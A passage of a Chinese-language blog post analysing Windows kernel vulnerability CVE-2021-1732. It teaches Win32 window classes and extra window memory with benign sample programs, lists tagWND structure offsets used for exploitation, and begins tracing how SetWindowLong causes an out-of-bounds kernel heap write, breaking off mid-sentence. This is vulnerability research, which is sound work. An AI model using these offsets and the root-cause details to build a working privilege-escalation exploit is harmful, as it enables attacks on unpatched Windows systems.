class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:<span class="comment">// #define WM_RBUTTONDOWN 0x0204 - 代表鼠标右键按下</span></span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;Right Button Down Detected&quot;</span>, <span class="string">L&quot;Message Arrival&quot;</span>, MB_OK); <span class="comment">// 简单弹个对话框</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam); <span class="comment">// 对其他消息都使用默认方式处理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hwnd;    <span class="comment">// 创建窗口函数 CreateWindowEx 会返回一个窗口句柄，这里定义下，用来接收这个句柄</span></span><br><span class="line">MSG msg;      <span class="comment">// 消息结构体，在消息循环的时候需要</span></span><br><span class="line">WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;; <span class="comment">// 创建窗口类结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 对窗口类的各属性进行初始化 */</span></span><br><span class="line">wndclass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);     <span class="comment">// 字段 cbSize 需要等于结构体 WNDCLASSEX 的大小</span></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW; <span class="comment">// 窗口类风格 - 窗口水平/竖直方向的长度变化时重绘整个窗口</span></span><br><span class="line">wndclass.lpfnWndProc = MyWndProc;         <span class="comment">// 窗口消息处理函数 - 这里使用上面声明的 MyWndProc</span></span><br><span class="line">wndclass.hInstance = hInstance;           <span class="comment">// 该窗口类的窗口消息处理函数所属的应用实例 - 这里就使用 hInstance</span></span><br><span class="line">wndclass.lpszClassName = <span class="string">L&quot;TestWndClass&quot;</span>; <span class="comment">// 窗口类名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册窗口类 */</span></span><br><span class="line"><span class="built_in">RegisterClassEx</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建窗口 */</span></span><br><span class="line">hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line"><span class="literal">NULL</span>,                              <span class="comment">// 扩展窗口风格</span></span><br><span class="line"><span class="string">L&quot;TestWndClass&quot;</span>,                   <span class="comment">// 窗口类名</span></span><br><span class="line"><span class="string">L&quot;Hello World&quot;</span>,                    <span class="comment">// 窗口标题</span></span><br><span class="line">WS_OVERLAPPEDWINDOW | WS_VISIBLE,  <span class="comment">// 窗口风格</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 x 坐标 - 这里使用默认值</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 y 坐标 - 这里使用默认值</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口宽度 - 这里使用默认值</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口高度 - 这里使用默认值</span></span><br><span class="line"><span class="literal">NULL</span>,                              <span class="comment">// 父窗口句柄</span></span><br><span class="line"><span class="literal">NULL</span>,                              <span class="comment">// 菜单句柄</span></span><br><span class="line">hInstance,                         <span class="comment">// 窗口句柄</span></span><br><span class="line"><span class="literal">NULL</span>                               <span class="comment">// 该值会传递给窗口 WM_CREATE 消息的一个参数</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 消息循环 */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);   <span class="comment">// 翻译消息</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);    <span class="comment">// 派发消息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行起来，你便得到了一个标题是 Hello World 的窗口：</p><p><img src="/img/article/20220104/reason_analysis/windows_desktop_program/1.png" alt="1"></p><p>在窗口中右键会弹出一个对话框：</p><p><img src="/img/article/20220104/reason_analysis/windows_desktop_program/2.png" alt="2"></p><p>我来解释一下这个程序是怎么工作的。首先，桌面应用对于程序员而言的入口点从常见的 main 变成了 <strong>WinMain</strong>（这里的 wWinMain 是 unicode 版 WinMain，表明程序中使用的字符为 unicode 编码）。其次，需要有个概念，那就是我们平常看到的应用程序窗口，都是某个<strong>窗口类</strong>的”实例”（注意，这里的类不是 C++ 类的概念），Windows 使用一个结构体来管理 行为/风格 相似一类窗口，其定义<sup>[6]</sup>如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagWNDCLASSEXW</span> &#123;</span></span><br><span class="line">    UINT        cbSize;        <span class="comment">// 该结构体的大小，通过这个字段来区分桌面开发的新旧版本</span></span><br><span class="line">    <span class="comment">/* Win 3.x */</span></span><br><span class="line">    UINT        style;         <span class="comment">// 窗口类的风格</span></span><br><span class="line">    WNDPROC     lpfnWndProc;   <span class="comment">// 窗口的消息处理函数</span></span><br><span class="line">    <span class="keyword">int</span>         cbClsExtra;    <span class="comment">// 窗口类的扩展内存大小</span></span><br><span class="line">    <span class="keyword">int</span>         cbWndExtra;    <span class="comment">// 窗口的扩展内存大小</span></span><br><span class="line">    HINSTANCE   hInstance;     <span class="comment">// 该窗口类的窗口消息处理函数所属的应用实例</span></span><br><span class="line">    HICON       hIcon;         <span class="comment">// 该窗口类所用的图标</span></span><br><span class="line">    HCURSOR     hCursor;       <span class="comment">// 该窗口类所用的光标</span></span><br><span class="line">    HBRUSH      hbrBackground; <span class="comment">// 该窗口类所用的背景刷</span></span><br><span class="line">    LPCWSTR     lpszMenuName;  <span class="comment">// 该窗口类所用的菜单资源</span></span><br><span class="line">    LPCWSTR     lpszClassName; <span class="comment">// 该窗口类的名称</span></span><br><span class="line">    <span class="comment">/* Win 4.0 */</span></span><br><span class="line">    HICON       hIconSm;       <span class="comment">// 该窗口类所用的小像标</span></span><br><span class="line">&#125; WNDCLASSEXW;</span><br></pre></td></tr></table></figure><p>从窗口类的定义可以看出，它包含了一个窗口的重要信息，如窗口风格、窗口过程、显示和绘制窗口所需要的信息，等等。可以使用 VS 自带的工具 Microsoft spy++ 来实际感知窗口类的存在，比如计算器对应的窗口类是 Windows.UI.Core.CoreWindow：</p><p><img src="/img/article/20220104/reason_analysis/windows_desktop_program/3.png" alt="3"></p><p>所以想要创建一个窗口”实例”，需要先向系统注册一个窗口类，这就是为什么开始的代码要这样写：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;; <span class="comment">// 创建窗口类结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 对窗口类的各属性进行初始化 */</span></span><br><span class="line">wndclass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);     <span class="comment">// 字段 cbSize 需要等于结构体 WNDCLASSEX 的大小</span></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW; <span class="comment">// 窗口类风格 - 窗口水平/竖直方向的长度变化时重绘整个窗口</span></span><br><span class="line">wndclass.lpfnWndProc = MyWndProc;         <span class="comment">// 窗口消息处理函数 - 这里使用上面声明的 MyWndProc</span></span><br><span class="line">wndclass.hInstance = hInstance;           <span class="comment">// 该窗口类的窗口消息处理函数所属的应用实例 - 这里就使用 hInstance</span></span><br><span class="line">wndclass.lpszClassName = <span class="string">L&quot;TestWndClass&quot;</span>; <span class="comment">// 窗口类名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册窗口类 */</span></span><br><span class="line"><span class="built_in">RegisterClassEx</span>(&amp;wndclass);</span><br></pre></td></tr></table></figure><p>现在我们就能用这个窗口类来创建看得见、摸得着的窗口了。创建窗口使用 CreateWindowEx<sup>[7]</sup> 函数，通过下面的代码，我们就能成功创建一个可见的窗口并得到它的窗口句柄：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 创建窗口 */</span></span><br><span class="line">hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line"><span class="literal">NULL</span>,                              <span class="comment">// 扩展窗口风格</span></span><br><span class="line"><span class="string">L&quot;TestWndClass&quot;</span>,                   <span class="comment">// 窗口类名</span></span><br><span class="line"><span class="string">L&quot;Hello World&quot;</span>,                    <span class="comment">// 窗口标题</span></span><br><span class="line">WS_OVERLAPPEDWINDOW | WS_VISIBLE,  <span class="comment">// 窗口风格</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 x 坐标 - 这里使用默认值</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 y 坐标 - 这里使用默认值</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口宽度 - 这里使用默认值</span></span><br><span class="line">CW_USEDEFAULT,                     <span class="comment">// 窗口高度 - 这里使用默认值</span></span><br><span class="line"><span class="literal">NULL</span>,                              <span class="comment">// 父窗口句柄</span></span><br><span class="line"><span class="literal">NULL</span>,                              <span class="comment">// 菜单句柄</span></span><br><span class="line">hInstance,                         <span class="comment">// 窗口句柄</span></span><br><span class="line"><span class="literal">NULL</span>                               <span class="comment">// 该值会传递给窗口 WM_CREATE 消息的一个参数</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>创建了窗口后，如果后面什么代码都不写，那程序就直接退出，创建的窗口也立马被销毁了，这个不能交互的桌面应用对用户来说毫无意义。为了给创建出的窗口注入灵魂，最后往往会加一个 while 主消息循环：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 消息循环 */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);   <span class="comment">// 翻译消息</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);    <span class="comment">// 派发消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们常常能听到一些名词，如事件驱动、Windows 消息处理机制等，这些概念集中体现在上面这个 while 循环中。为什么在窗口中右键，会弹出一个对话框？那是因为鼠标右键按下被视作了一个事件，当这个事件在窗口中发生时，系统会去调用窗口所属窗口类的 WNDCLASSEX.lpfnWndProc 回调函数来响应，这个函数中写了弹出对话框的代码，因此才会有这样的效果。</p><p>那么问题来了，为什么我按鼠标左键它不会弹出对话框？照你这个说法，鼠标左键按下也是一个事件，系统不也会调用同一个回调 WNDCLASSEX.lpfnWndProc，那行为应该相同（即弹出对话框）才对啊？诚然，不论是左键还是右键按下，该窗口的 WNDCLASSEX.lpfnWndProc 都会被调用，而结果我们也清楚 —— 只有右键按下才会弹出对话框，这个函数是怎么做到区分左/右键按下的呢？</p><p>事实上，操作系统会把每个到来的事件包装成一个消息结构体（MSG 结构体，不是本文关注点，这里就不列出它的各个字段了），这个结构体记录了事件发生在哪个窗口（窗口句柄）、事件对应的消息编号（<strong>每种事件都对应了一个唯一的编号</strong>）、事件发生时所处的坐标等。系统将这个 MSG 结构体放入线程的消息队列，当线程调用 GetMessage 时，就能从队列中取出这个结构体，再通过 DispatchMessage 根据 MSG 结构体中的窗口句柄，向对应窗口递送该消息（具体体现就是调用那个窗口的 lpfnWndProc）。TranslateMessage 函数用于做一些虚拟键消息转换，与我们所说的内容关系不大，可以忽略掉这个函数。</p><p>现在就可以解释为什么按下左键没有弹出对话框了，来看本例代码中的窗口过程函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:<span class="comment">// #define WM_RBUTTONDOWN 0x0204 - 代表鼠标右键按下</span></span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;Right Button Down Detected&quot;</span>, <span class="string">L&quot;Message Arrival&quot;</span>, MB_OK); <span class="comment">// 简单弹个对话框</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam); <span class="comment">// 对其他消息都使用默认方式处理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左键按下和右键按下是不同的事件，它们的消息编号不同，所以当回调 MyWndProc 先后被调用时，参数 message 的值就不同（分别是 WM_<strong>L</strong>BUTTONDOWN 和 WM_<strong>R</strong>BUTTONDOWN）。在函数实现中，通过一个 switch 语句来判断消息的类型，针对不同的消息，采取不同的相应措施。比如上面的代码，我们判断当消息是右键按下时就弹个对话框，其他的消息使用默认方式处理（这种窗口中左键按下的默认处理方式就是什么也不做）。</p><p>有了上面的基本概念后，我们来拓展聊聊 WNDCLASSEX 结构体的 cbClsExtra 和 cbWndExtra 字段，之前注释里也写了，它们分别表示<strong>窗口类</strong>的扩展内存大小和<strong>窗口</strong>的扩展内存大小，那扩展内存有什么用？二者又有什么区别呢？</p><p>先说说什么是<strong>窗口类</strong>的扩展内存。在应用程序注册一个窗口类时，可以让系统分配一定大小的内存空间，作为该窗口类的扩展内存，之后属于该窗口类的每个窗口都共享这片内存区域，每个窗口都可以通过 Windows 提供的 API 来读写这片扩展内存，如 GetClassLong、GetClassLongPtr、SetClassLong、SetClassLongPtr 等（Ptr 后缀是为了兼容 32 和 64 位），以此实现同窗口类的窗口间通信，而 cbClsExtra 字段就记录了这片内存的大小。</p><p>同理，当<strong>窗口</strong>创建时，可以让系统分配一定大小的内存空间，作为该窗口的扩展内存，这就是窗口的扩展内存。这片内存每个窗口独享，也可以通过 API 来读写（GetWindowLong、GetWindowLongPtr、SetWindowLong、SetWindowLongPtr），该机制提供了一种窗口数据暂存的方式，这片内存的大小由 cbWndExtra 字段记录。</p><p>还是通过一个实例来感受 cbWndExtra 字段的意义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 通过 GetWindowLongPtr 获取偏移为 0 和 8 的两个 long long 的值 */</span></span><br><span class="line">LONG_PTR A = <span class="built_in">GetWindowLongPtr</span>(hWnd, <span class="number">0</span>);</span><br><span class="line">LONG_PTR B = <span class="built_in">GetWindowLongPtr</span>(hWnd, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">wchar_t</span>* content = <span class="keyword">new</span> <span class="keyword">wchar_t</span>[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:  <span class="comment">// 左键按下时，输出 A 的值</span></span><br><span class="line"><span class="built_in">wsprintf</span>(content, <span class="string">L&quot;%p&quot;</span>, A);</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, content, <span class="string">L&quot;Left Button Down&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:  <span class="comment">// 右键按下时，输出 B 的值</span></span><br><span class="line"><span class="built_in">wsprintf</span>(content, <span class="string">L&quot;%p&quot;</span>, B);</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, content, <span class="string">L&quot;Right Button Down&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hwnd;</span><br><span class="line">MSG msg;</span><br><span class="line">WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">wndclass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);</span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wndclass.lpfnWndProc = MyWndProc;</span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.lpszClassName = <span class="string">L&quot;TestWndClass&quot;</span>;</span><br><span class="line"><span class="comment">/* 使用 cbWndExtra 字段，设置扩展内存大小为两个 long long */</span></span><br><span class="line">wndclass.cbWndExtra = <span class="number">2</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">RegisterClassEx</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line">hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="string">L&quot;TestWndClass&quot;</span>, <span class="string">L&quot;Hello World&quot;</span>,</span><br><span class="line">WS_OVERLAPPEDWINDOW | WS_VISIBLE,</span><br><span class="line">CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过 SetWindowLongPtr 设置偏移为 0 和 8 的两个 long long 的值 */</span></span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hwnd, <span class="number">0</span>, <span class="number">0xAAAAAAAAAAAAAAAA</span>);</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hwnd, <span class="number">8</span>, <span class="number">0xBBBBBBBBBBBBBBBB</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行起来，按下左键：</p><p><img src="/img/article/20220104/reason_analysis/windows_desktop_program/4.png" alt="4"></p><p>按下右键：</p><p><img src="/img/article/20220104/reason_analysis/windows_desktop_program/5.png" alt="5"></p><p>好了，关于 Windows 桌面编程就先聊到这儿吧，花了不少的篇幅来引出 cbWndExtra 字段，是因为该字段不为 0（窗口具有扩展内存）正是 CVE-2021-1732 漏洞利用的导火索。</p><br><h3 id="tagWND-结构体"><a href="#tagWND-结构体" class="headerlink" title="tagWND 结构体"></a>tagWND 结构体</h3><p>与每个窗口类对应一个结构体类似，Windows 使用 tagWND 结构体来描述每个窗口，这个结构体在加载了官方 pdb 文件的 Win7 win32k.sys 模块可以找到<sup>[8]</sup>。可能是由于泄露了太多对开发者无用的内核符号，导致 win32k 被五花八门的漏洞利用手段玩坏了，Win7 往后，微软去掉了 pdb 文件中很多内核符号，其中就包括 tagWND。所以目前，我们只能通过参考 Win7 及以前的符号，并结合 API 逆向分析来推测 Win10 中 tagWND 各字段的含义。</p><p>值得庆幸的是，已经有人在这方面做了很多工作了。在前辈们的经验总结下<sup>[8][9][10]</sup>，我们可以得知，在 Win10 中，<strong>对于每个窗口，系统为用户层和内核层各维护了一个 tagWND 结构体</strong>，用户层的 &amp;tagWND + 0x28 处的 8 字节为一个指针，指向内核层 tagWND 结构体。后文将使用 tagWND/tagWNDk 来表示 用户层/内核层 tagWND 结构体，ptagWND/ptagWNDk 来表示 用户层/内核层 tagWND 结构体指针。</p><p>下面列出 tagWND 结构体中与漏洞相关的字段（一个”Tab 缩进 + 偏移量”表示一次<strong>父级的值加偏移后访存</strong>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ptagWND(user layer)</span><br><span class="line">0x10 unknown</span><br><span class="line">0x00 pTEB</span><br><span class="line">0x220 pEPROCESS(of current process)</span><br><span class="line">0x18 unknown</span><br><span class="line">0x80 kernel desktop heap base</span><br><span class="line">0x28 ptagWNDk(kernel layer)</span><br><span class="line">0x00 hwnd</span><br><span class="line">0x08 kernel desktop heap base offset</span><br><span class="line">0x18 dwStyle</span><br><span class="line">0x58 Window Rect left</span><br><span class="line">0x5C Window Rect top</span><br><span class="line">0x98 spMenu(uninitialized)</span><br><span class="line">0xC8 cbWndExtra</span><br><span class="line">0xE8 dwExtraFlag</span><br><span class="line">0x128 pExtraBytes</span><br><span class="line">0x90 spMenu(analyzed by myself)</span><br><span class="line">0x00 hMenu</span><br><span class="line">0x18 unknown0</span><br><span class="line">0x100 unknown</span><br><span class="line">0x00 pEPROCESS(of current process)</span><br><span class="line">0x28 unknown1</span><br><span class="line">0x2C cItems(for check)</span><br><span class="line">0x40 unknown2(for check)</span><br><span class="line">0x44 unknown3(for check)</span><br><span class="line">0x50 ptagWND</span><br><span class="line">0x58 rgItems</span><br><span class="line">0x00 unknown(for exploit)</span><br><span class="line">0x98 spMenuk</span><br><span class="line">0x00 pSelf</span><br></pre></td></tr></table></figure><p>后面的分析在用到 tagWND 时，可以翻回这个部分进行查阅。</p><br><h3 id="以结果为导向"><a href="#以结果为导向" class="headerlink" title="以结果为导向"></a>以结果为导向</h3><p>本 CVE 的 POC 所达到的效果，就是可以在用户态调用 SetWindowLong 来造成一次<strong>内核桌面堆的越界写</strong>。SetWindowLong 实际调用 user32!SetWindowLongW，其中又调用了 win32u!NtUserSetWindowLong：</p><p><img src="/img/article/20220104/reason_analysis/result_based/1.png" alt="1"></p><p>之后通过系统调用进入内核态，调用 win32kfull!NtUserSetWindowLong，并最终调用 win32kfull!xxxSetWindowLong，传入根据窗口句柄找到的 tagWND 结构体地址（ptagWND）、写入的扩展内存的偏移（nIndex）、要写入的值（value）：</p><p><img src="/img/article/20220104/reason_analysis/result_based/2.png" alt="2"></p><p>调用栈我也贴在这里：<br><img src="/img/article/20220104/reason_analysis/result_based/3.png" alt="3"></p><p>进入 xxxSetWindowLong 后，在 59 行获得了内核 tagWND 结构体指针：</p><p><img src="/img/article/20220104/reason_analysis/result_based/4.png" alt="4"></p><p>从 117 行可以看出 <strong>nIndex 的值必须小于 ptagWNDk-&gt;cbWndExtra</strong>（窗口扩展内存大小，该值在注册窗口类时指定）：</p><p><img src="/img/article/20220104/reason_analysis/result_based/5.png" alt="5"></p><p>由 157、158、162 行可知当 <code>ptagWNDk-&gt;dwExtraFlag &amp; 0x800 != 0</code> 时，<strong>内核桌面堆起始地址 + pExtraBytes + nIndex</strong> 处的 4 字节会被赋值成 value：</p><p><img src="/img/article/20220104/reason_analysis/result_based/6.png" alt="6"></p><p>POC 就是通过控制 